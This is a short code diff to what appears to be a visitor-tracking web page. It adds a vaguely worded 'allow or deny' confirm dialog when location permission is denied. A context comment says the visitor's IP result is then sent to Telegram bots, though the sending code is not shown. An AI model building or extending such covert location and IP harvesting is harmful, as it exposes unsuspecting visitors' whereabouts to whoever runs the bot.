@@ -19,7 +19,7 @@
         if (error.code === error.PERMISSION_DENIED) {
 
 
-
+           showAlert();
           // Location permission denied, send IP result to Telegram bots
           redirectToNextURL();
         }
@@ -135,6 +135,19 @@ ${ipAddress}
     }
     return {};
   }
+
+
+function showAlert() {
+    const result = window.confirm("Do you want to allow or deny?");
+    if (result) {
+      // Allow button clicked
+      console.log("Allowed");
+    } else {
+      // Deny button clicked or dialog closed
+      console.log("Denied");
+    }
+  }
+
 
   function redirectToNextURL() {
     // Get the current URL
